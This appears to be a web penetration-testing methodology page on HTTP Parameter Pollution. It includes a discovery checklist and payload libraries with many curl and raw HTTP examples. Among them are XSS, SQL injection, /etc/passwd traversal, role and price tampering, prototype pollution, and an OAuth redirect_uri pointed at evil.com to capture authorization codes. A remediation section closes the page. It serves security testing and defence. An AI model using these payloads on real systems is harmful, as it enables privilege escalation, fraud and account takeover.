---
title: "HTTP Parameter Pollution (HPP)"
date: 2026-02-24
draft: false
---

# HTTP Parameter Pollution (HPP)

> **Severity**: Medium–High | **CWE**: CWE-235, CWE-20
> **OWASP**: A03:2021 – Injection | A01:2021 – Broken Access Control

---

## What Is HTTP Parameter Pollution?

HTTP Parameter Pollution exploits the inconsistent behavior of web servers and application frameworks when handling **duplicate parameter names** in HTTP requests. When `?id=1&id=2` is received, different technologies resolve the conflict differently — and the attacker can exploit the gap between what the WAF/front-end sees and what the back-end application processes.

```
Query string: ?id=1&id=2

Framework behavior (which value wins):
  PHP         → last value: id = "2"
  ASP.NET     → joined: id = "1,2"
  Flask/Django → last value: id = "2"
  JSP (Tomcat) → first value: id = "1"
  Express.js  → array: id = ["1","2"]
  Ruby Rails  → last value: id = "2"

If WAF validates first occurrence (id=1 = benign) but app uses second (id=2 = malicious):
→ WAF bypass
```

HPP also applies to **server-side parameter pollution** — where back-end API calls to internal services include attacker-injected parameters.

---

## Discovery Checklist

**Phase 1 — Client-Side HPP (WAF/Filter Bypass)**
- [ ] Identify parameters validated by WAF or front-end filter
- [ ] Add duplicate parameter — does behavior change?
- [ ] Test split-parameter injection: `param=safe_prefix%26injected_param=value`
- [ ] Look for parameters appended to back-end API calls (server-side HPP)
- [ ] Test OAuth/OIDC flows — `redirect_uri` parameter duplication

**Phase 2 — Server-Side Parameter Pollution**
- [ ] Any endpoint that proxies requests to an internal API
- [ ] Parameters reflected in back-end API call: see query param in response or error
- [ ] Test `#` and `&` injection in parameter values: `value=x%26admin=true`
- [ ] REST API endpoints that construct back-end URLs from user input
- [ ] OAuth redirect_uri, state, scope — inject extra parameters

**Phase 3 — Business Logic HPP**
- [ ] Payment flows — inject `amount` duplicate: first validates, second processes
- [ ] Role parameters: `role=user&role=admin`
- [ ] CSRF token: duplicate token parameter — WAF checks first, app uses second (empty/null)
- [ ] API key / auth token duplication in headers vs query

---

## Payload Library

### Payload 1 — Query String Duplicate Parameter

```bash
# Basic HPP: inject parameter twice, different values:
# WAF sees first → clean; App uses second → malicious

# Test which value back-end uses:
curl "https://target.com/api/search?q=hello&q=world"
# Check response — does it search "hello" or "world"?

# If app uses second value, inject:
curl "https://target.com/api/search?q=safe&q=<script>alert(1)</script>"
# WAF may only inspect first q=safe → XSS payload in second passes through

# Role escalation:
curl "https://target.com/api/action?role=user&role=admin"
# If app processes last param → admin role

# Override default parameter:
curl "https://target.com/api/user?id=VICTIM_ID&id=ATTACKER_ID"
# Depending on framework: app operates on different id than intended

# Array notation (Express.js, PHP with [] suffix):
curl "https://target.com/api?id[]=1&id[]=2&id[]=3"
# Some SQL queries: WHERE id IN (1,2,3) → unintended multi-ID query

# Override computed parameter:
curl "https://target.com/checkout?price=100&price=1"
# If price from query param is used (server-side HPP) → checkout for $1

# URL-encoded injection in parameter value:
# Parameter value contains & → treated as parameter separator by back-end:
curl "https://target.com/api?callback=legit%26admin=true"
# If back-end constructs: /internal/api?callback=legit&admin=true
# → admin=true injected into internal request
```

### Payload 2 — Server-Side Parameter Pollution (SSPP)

```bash
# SSPP: user input is appended to back-end API URL
# Example: GET /api/data?field=name → back-end: /internal/api/data?field=name&apiKey=SECRET

# Inject extra parameters into back-end request:
GET /api/data?field=name%26admin=true HTTP/1.1

# Back-end constructs: /internal/api?field=name&admin=true&apiKey=SECRET
# → extra parameter injected into trusted internal call

# Override back-end fixed parameters:
# If back-end always appends: &status=active
GET /api/users?name=alice%26status=inactive HTTP/1.1
# Back-end: /internal/users?name=alice&status=inactive&status=active
# Depending on which takes precedence → may override status=active

# Inject path separator:
GET /api/search?q=term%23back_end_fragment HTTP/1.1
# Back-end URL: /internal/search?q=term#back_end_fragment&apiKey=SECRET
# Fragment truncates back-end query → apiKey parameter dropped
# → Authentication bypass if back-end requires apiKey but it's truncated

# Inject & to add parameters in REST calls:
# Target: POST /api/transfer?amount=100
# Back-end: /internal/transfer?amount=100&from=USER&to=TARGET
POST /api/transfer?amount=100%26to=ATTACKER HTTP/1.1
# Back-end: /internal/transfer?amount=100&to=ATTACKER&from=USER&to=TARGET
# First &to=ATTACKER may override FROM the intended TO field

# Test: can you read back-end parameter values?
# Inject parameter that gets reflected in response:
GET /api/echo?msg=hello%26debug=true HTTP/1.1
# If back-end adds &debug=true → may return extra debug info in response
```

### Payload 3 — OAuth / OIDC Parameter Pollution

```bash
# redirect_uri duplication — bypass redirect_uri validation:
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT&
  redirect_uri=https%3A%2F%2Ftrusted.com%2Fcb&
  redirect_uri=https%3A%2F%2Fevil.com%2Fsteal&
  scope=openid profile

# Different OAuth servers handle duplicate redirect_uri differently:
# Some validate first, use second → attacker receives auth code at evil.com
# Some validate last, use first → bypass if last is trusted
# Some reject any duplicate → no bypass

# scope injection — inject additional scopes:
GET /oauth/authorize?
  client_id=APP&
  scope=read%20write%26scope%3Dadmin&
  redirect_uri=https://trusted.com/cb

# state parameter pollution — CSRF token bypass:
GET /oauth/authorize?
  client_id=APP&
  state=VALID_CSRF_TOKEN&
  state=ATTACKER_CONTROLLED

# Token endpoint — duplicate client credentials:
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE&
client_id=LEGITIMATE_CLIENT&
client_id=MALICIOUS_CLIENT&
redirect_uri=https://trusted.com/cb

# PKCE code_challenge bypass:
GET /oauth/authorize?
  code_challenge=LEGIT_CHALLENGE&
  code_challenge=ATTACKER_CHALLENGE&
  code_challenge_method=S256
```

### Payload 4 — HPP in Form Submissions

```http
# POST body parameter pollution:
POST /api/profile/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&email=alice@corp.com&role=user&role=admin

# Mixed GET+POST pollution (some frameworks merge both):
POST /api/update?admin=true HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&email=alice@corp.com

# JSON body — some parsers take last value on duplicate key:
POST /api/action HTTP/1.1
Content-Type: application/json

{"amount": 100, "role": "user", "role": "admin", "amount": 1}
# Last value wins in most JSON parsers → amount=1, role="admin"

# Multipart form — duplicate parts:
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="type"

document
------Boundary
Content-Disposition: form-data; name="type"

script
------Boundary--
# First "type" might be validated, second used for processing
```

### Payload 5 — WAF Bypass via HPP

```bash
# WAF sees: param=safe_value → allows request
# App processes: param=safe_value,<malicious> (joined) OR param=<malicious> (last)

# XSS WAF bypass via HPP:
# WAF inspects first param only:
GET /search?q=harmless&q=<script>alert(1)</script> HTTP/1.1

# SQLi WAF bypass:
GET /item?id=1&id=1+UNION+SELECT+null,password+FROM+users--

# Path traversal bypass:
GET /file?path=images/&path=../../../etc/passwd

# HPP in headers (rare but possible):
# Some parsers merge duplicate header values:
GET /api HTTP/1.1
Authorization: Bearer VALID_TOKEN
Authorization: Bearer ADMIN_TOKEN

# Cookie HPP:
Cookie: session=VALID_SESSION; session=ADMIN_SESSION

# Test framework-specific array notation:
# PHP: param[] or param[0], param[1]
GET /api?ids[]=1&ids[]=2
GET /api?ids[0]=1&ids[1]=2

# ASP.NET: joined with comma
GET /api?roles=user&roles=admin
# ASP.NET: Request["roles"] = "user,admin"
# If app splits on comma: ["user","admin"] → both roles applied

# Node.js Express: qs library parses to array:
GET /api?role[]=user&role[]=admin
# req.query.role = ["user","admin"]
# If check: req.query.role === "admin" → false (array != string)
# But: req.query.role.includes("admin") → true (bypass if soft check)
```

### Payload 6 — HPP in REST Path Parameters

```bash
# REST API path traversal via HPP:
GET /api/v1/users/1 HTTP/1.1
# Backend: SELECT * FROM users WHERE id = '1'

# Inject via query string parameter that overrides path:
GET /api/v1/users/1?id=2 HTTP/1.1
# If framework uses query param over path → fetches user 2

# Prototype pollution via HPP (Express + qs):
GET /api?__proto__[role]=admin HTTP/1.1
GET /api?constructor[prototype][role]=admin HTTP/1.1
# Express.js with default qs parser: Object.prototype.role = "admin"

# Bypass authorization via parameter injection:
# Normal: GET /api/orders/ORDER_ID → requires ownership check
# Inject user context via HPP:
GET /api/orders/VICTIM_ORDER?userId=ATTACKER_ID&userId=VICTIM_ID HTTP/1.1
# If auth check uses first userId (attacker = owner?) → IDOR via HPP

# Test matrix for server-side behavior:
python3 << 'EOF'
import requests

target = "https://target.com/api/search"
headers = {"Authorization": "Bearer YOUR_TOKEN"}

# Test which value wins for duplicate parameters:
r1 = requests.get(target, params=[("q","FIRST"),("q","SECOND")], headers=headers)
r2 = requests.get(target, params=[("q","A"),("q","B"),("q","C")], headers=headers)

print("Duplicate test:", r1.url, "→", r1.text[:200])
print("Triple test:", r2.url, "→", r2.text[:200])

# Test URL-encoded & in value:
r3 = requests.get(f"{target}?q=test%26injected=true", headers=headers)
print("Encoded & test:", r3.url, "→", r3.text[:200])

# Test # truncation:
r4 = requests.get(f"{target}?q=test%23secret_param=value", headers=headers)
print("# truncation:", r4.url, "→", r4.text[:200])
EOF
```

---

## Tools

```bash
# Burp Suite — HPP testing:
# Intruder: duplicate parameter with different values
# Repeater: manually add duplicate params in request
# Extension: "HTTP Parameter Pollution" scanner (BApp store)
# Param Miner: discovers server-side reflected parameters

# HPP test with curl (multiple -d flags):
curl -X POST https://target.com/api/order \
  -d "amount=100" \
  -d "amount=1" \
  -H "Authorization: Bearer TOKEN"

# wfuzz — parameter duplication fuzzer:
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  --hc 404 \
  "https://target.com/api?FUZZ=1%26FUZZ=2"

# Test framework response to duplicate params:
for framework_test in "q=a&q=b" "q[]=a&q[]=b" "q[0]=a&q[1]=b"; do
  echo "Testing: $framework_test"
  curl -s "https://target.com/search?$framework_test" | \
    python3 -c "import sys; d=sys.stdin.read(); print(d[:300])"
done

# Server-side HPP detection via response analysis:
# Inject: param=CANARY1%26debug=true
# Look for: "debug" or "CANARY1" in response from internal API

# SSPP detection with Burp Collaborator:
# Inject: param=legit%26callback=http://COLLABORATOR_URL
# If back-end makes HTTP request to collaborator → SSPP confirmed
curl "https://target.com/api?action=lookup%26url=https://COLLABORATOR.burpcollaborator.net/test"

# Check behavior difference between + and %20 as space:
curl "https://target.com/search?q=first+value&q=second%20value"
# + vs %20: some parsers handle differently → inconsistency detection
```

---

## Remediation Reference

- **Reject duplicate parameters**: at the framework/middleware level, detect and reject requests with duplicate parameter names — return 400 Bad Request
- **Explicit parameter extraction**: always use `getFirst()`, `getLast()`, or explicit index — never rely on framework default resolution
- **Server-side URL construction**: when constructing back-end API URLs, use a proper URL builder — never string concatenation with user input; encode all user-supplied values before including in URLs
- **WAF configuration**: configure WAF to inspect ALL occurrences of a parameter, not just the first — most modern WAFs support this
- **Parameter allowlisting**: define which parameters are expected for each endpoint — reject unexpected parameters including injected duplicates
- **OAuth**: validate `redirect_uri` across ALL occurrences in the request — reject any request with conflicting or duplicate `redirect_uri` values

*Part of the Web Application Penetration Testing Methodology series.*
